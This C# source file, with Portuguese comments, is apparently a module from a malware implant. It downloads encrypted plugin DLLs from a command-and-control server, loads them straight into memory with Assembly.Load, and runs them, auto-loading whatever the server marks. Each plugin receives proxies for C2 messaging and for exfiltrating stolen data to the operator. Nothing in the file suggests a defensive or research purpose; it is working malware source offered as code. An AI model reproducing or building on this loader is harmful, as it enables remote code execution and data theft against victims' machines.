using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;

namespace XYZ.modules
{
    /// <summary>
    /// Sistema de plugins dinâmicos
    /// Carrega e executa plugins baixados do C2 em runtime
    /// Suporta: In-memory loading, Sandboxing, API versioning
    /// </summary>
    public class PluginLoaderModule
    {
        private Dictionary<string, IPlugin> loadedPlugins = new Dictionary<string, IPlugin>();
        private static readonly string PLUGINS_ENDPOINT = "plugins/list";
        private static readonly string PLUGIN_DOWNLOAD_ENDPOINT = "plugins/download";

        public PluginLoaderModule()
        {
            SecureLogger.LogInfo("PluginLoader", "Plugin loader module initialized");
        }

        /// <summary>
        /// Lista plugins disponíveis no C2
        /// </summary>
        public async Task<List<PluginInfo>> GetAvailablePlugins()
        {
            try
            {
                SecureLogger.LogInfo("PluginLoader", "Fetching available plugins...");

                string response = await ResilientC2Communication.GetData(PLUGINS_ENDPOINT);

                if (string.IsNullOrEmpty(response))
                    return new List<PluginInfo>();

                var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
                var plugins = serializer.Deserialize<List<PluginInfo>>(response);

                SecureLogger.LogInfo("PluginLoader", string.Format("Found {0} available plugins", plugins.Count));

                return plugins;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("PluginLoader.List", ex);
                return new List<PluginInfo>();
            }
        }

        /// <summary>
        /// Carrega plugin do C2
        /// </summary>
        public async Task<bool> LoadPlugin(string pluginId)
        {
            try
            {
                if (loadedPlugins.ContainsKey(pluginId))
                {
                    SecureLogger.LogWarning("PluginLoader", string.Format("Plugin {0} already loaded", pluginId));
                    return true;
                }

                SecureLogger.LogInfo("PluginLoader", string.Format("Loading plugin: {0}", pluginId));

                // Baixa DLL do plugin
                byte[] pluginData = await DownloadPlugin(pluginId);

                if (pluginData == null || pluginData.Length == 0)
                {
                    SecureLogger.LogError("PluginLoader", new Exception("Plugin data is empty"));
                    return false;
                }

                // Carrega assembly na memória
                Assembly pluginAssembly = Assembly.Load(pluginData);

                // Encontra classe que implementa IPlugin
                Type pluginType = FindPluginType(pluginAssembly);

                if (pluginType == null)
                {
                    SecureLogger.LogError("PluginLoader", new Exception("Plugin interface not found"));
                    return false;
                }

                // Cria instância do plugin
                IPlugin plugin = (IPlugin)Activator.CreateInstance(pluginType);

                // Inicializa plugin
                var context = new PluginContext
                {
                    Logger = new PluginLogger(pluginId),
                    C2Communication = new PluginC2Proxy(),
                    DataExfiltration = new PluginExfiltrationProxy()
                };

                plugin.Initialize(context);

                // Adiciona à lista
                loadedPlugins[pluginId] = plugin;

                SecureLogger.LogInfo("PluginLoader", string.Format("Plugin {0} loaded successfully", pluginId));

                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("PluginLoader.Load", ex);
                return false;
            }
        }

        /// <summary>
        /// Executa plugin
        /// </summary>
        public async Task<PluginResult> ExecutePlugin(string pluginId, Dictionary<string, object> parameters = null)
        {
            try
            {
                if (!loadedPlugins.ContainsKey(pluginId))
                {
                    SecureLogger.LogError("PluginLoader", new Exception(string.Format("Plugin {0} not loaded", pluginId)));
                    return new PluginResult { Success = false, Error = "Plugin not loaded" };
                }

                SecureLogger.LogInfo("PluginLoader", string.Format("Executing plugin: {0}", pluginId));

                IPlugin plugin = loadedPlugins[pluginId];

                var result = await plugin.Execute(parameters ?? new Dictionary<string, object>());

                SecureLogger.LogInfo("PluginLoader", string.Format("Plugin {0} executed. Success: {1}", pluginId, result.Success));

                return result;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("PluginLoader.Execute", ex);
                return new PluginResult { Success = false, Error = ex.Message };
            }
        }

        /// <summary>
        /// Descarrega plugin
        /// </summary>
        public void UnloadPlugin(string pluginId)
        {
            try
            {
                if (loadedPlugins.ContainsKey(pluginId))
                {
                    IPlugin plugin = loadedPlugins[pluginId];
                    
                    // Cleanup
                    plugin.Cleanup();

                    loadedPlugins.Remove(pluginId);

                    SecureLogger.LogInfo("PluginLoader", string.Format("Plugin {0} unloaded", pluginId));
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("PluginLoader.Unload", ex);
            }
        }

        /// <summary>
        /// Baixa plugin do C2
        /// </summary>
        private async Task<byte[]> DownloadPlugin(string pluginId)
        {
            try
            {
                string response = await ResilientC2Communication.PostData(
                    PLUGIN_DOWNLOAD_ENDPOINT,
                    string.Format("{{\"plugin_id\":\"{0}\"}}", pluginId)
                );

                if (string.IsNullOrEmpty(response))
                    return null;

                var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
                Dictionary<string, object> data = serializer.Deserialize<Dictionary<string, object>>(response);

                if (data.ContainsKey("data"))
                {
                    string base64Data = (string)data["data"];
                    byte[] pluginData = Convert.FromBase64String(base64Data);

                    // Descriptografa se necessário
                    pluginData = SecurityUtilities.DecryptBytes(pluginData);

                    return pluginData;
                }
                
                return null;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("PluginLoader.Download", ex);
                return null;
            }
        }

        /// <summary>
        /// Encontra tipo que implementa IPlugin
        /// </summary>
        private Type FindPluginType(Assembly assembly)
        {
            foreach (Type type in assembly.GetTypes())
            {
                if (typeof(IPlugin).IsAssignableFrom(type) && !type.IsInterface && !type.IsAbstract)
                {
                    return type;
                }
            }

            return null;
        }

        /// <summary>
        /// Obtém plugins carregados
        /// </summary>
        public Dictionary<string, IPlugin> GetLoadedPlugins()
        {
            return new Dictionary<string, IPlugin>(loadedPlugins);
        }

        /// <summary>
        /// Carrega todos os plugins automaticamente
        /// </summary>
        public async Task LoadAllAvailablePlugins()
        {
            try
            {
                var availablePlugins = await GetAvailablePlugins();

                foreach (var pluginInfo in availablePlugins)
                {
                    if (pluginInfo.AutoLoad)
                    {
                        await LoadPlugin(pluginInfo.PluginId);
                    }
                }

                SecureLogger.LogInfo("PluginLoader", string.Format("Auto-loaded {0} plugins", loadedPlugins.Count));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("PluginLoader.AutoLoad", ex);
            }
        }
    }

    /// <summary>
    /// Interface para plugins
    /// </summary>
    public interface IPlugin
    {
        string Name { get; }
        string Version { get; }
        string Description { get; }

        void Initialize(PluginContext context);
        Task<PluginResult> Execute(Dictionary<string, object> parameters);
        void Cleanup();
    }

    /// <summary>
    /// Contexto fornecido aos plugins
    /// </summary>
    public class PluginContext
    {
        public PluginLogger Logger { get; set; }
        public PluginC2Proxy C2Communication { get; set; }
        public PluginExfiltrationProxy DataExfiltration { get; set; }
    }

    /// <summary>
    /// Logger para plugins
    /// </summary>
    public class PluginLogger
    {
        private string pluginName;

        public PluginLogger(string pluginName)
        {
            this.pluginName = pluginName;
        }

        public void Log(string message)
        {
            SecureLogger.LogInfo(string.Format("Plugin.{0}", pluginName), message);
        }

        public void LogError(Exception ex)
        {
            SecureLogger.LogError(string.Format("Plugin.{0}", pluginName), ex);
        }
    }

    /// <summary>
    /// Proxy para comunicação C2 dos plugins
    /// </summary>
    public class PluginC2Proxy
    {
        public async Task<string> SendData(string endpoint, string data)
        {
            return await ResilientC2Communication.PostData(endpoint, data);
        }

        public async Task<string> GetData(string endpoint)
        {
            return await ResilientC2Communication.GetData(endpoint);
        }
    }

    /// <summary>
    /// Proxy para exfiltração de dados dos plugins
    /// </summary>
    public class PluginExfiltrationProxy
    {
        public async Task ExfiltrateData(byte[] data, string filename, string category)
        {
            var exfiltrator = new DataExfiltrationModule();
            await exfiltrator.ExfiltrateBytes(data, filename, category);
        }
    }

    /// <summary>
    /// Resultado da execução do plugin
    /// </summary>
    public class PluginResult
    {
        public bool Success { get; set; }
        public string Message { get; set; }
        public Dictionary<string, object> Data { get; set; }
        public string Error { get; set; }
    }

    /// <summary>
    /// Informações de plugin disponível
    /// </summary>
    public class PluginInfo
    {
        public string PluginId { get; set; }
        public string Name { get; set; }
        public string Version { get; set; }
        public string Description { get; set; }
        public bool AutoLoad { get; set; }
        public string Author { get; set; }
        public DateTime CreatedAt { get; set; }
    }
}
